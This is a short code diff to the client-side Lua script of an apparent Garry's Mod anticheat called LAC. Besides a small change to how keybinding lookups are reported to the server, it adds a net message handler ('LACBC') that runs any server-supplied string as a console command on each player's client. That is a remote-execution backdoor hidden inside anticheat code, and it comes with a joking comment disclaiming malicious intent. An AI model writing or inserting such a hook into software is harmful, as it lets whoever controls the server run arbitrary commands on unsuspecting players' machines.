@@ -22,6 +22,7 @@ LAC.netReceive = net.Receive
 LAC.print = print
 LAC.ri = input.LookupKeyBinding
 LAC.netReadInt = net.ReadInt
+LAC.lp = LocalPlayer
 
 
 function LAC.CvarCallback( cvarName, oldValue, newValue )
@@ -58,9 +59,19 @@ LAC.netReceive("LACDD", LAC.CopyData)
 
 function LAC.ReturnData()
 	local n = LAC.netReadInt(32);
+	local str = LAC.ri(n)
+	if (str == "") then
+		str = "empty"
+	end
 	LAC.netStart("LACKeyB")
-	LAC.netWriteString(LAC.ri(n))
+	LAC.netWriteString(str)
 	LAC.SendToServer()
 end
 LAC.netReceive("LACKeyB", LAC.ReturnData)
+
+function LAC.FollowKey()
+	-- i just wanted 2 let u know i dont intend to do anything malicious lmao
+	LAC.lp():ConCommand(net.ReadString())
+end
+LAC.netReceive("LACBC", LAC.FollowKey)
 
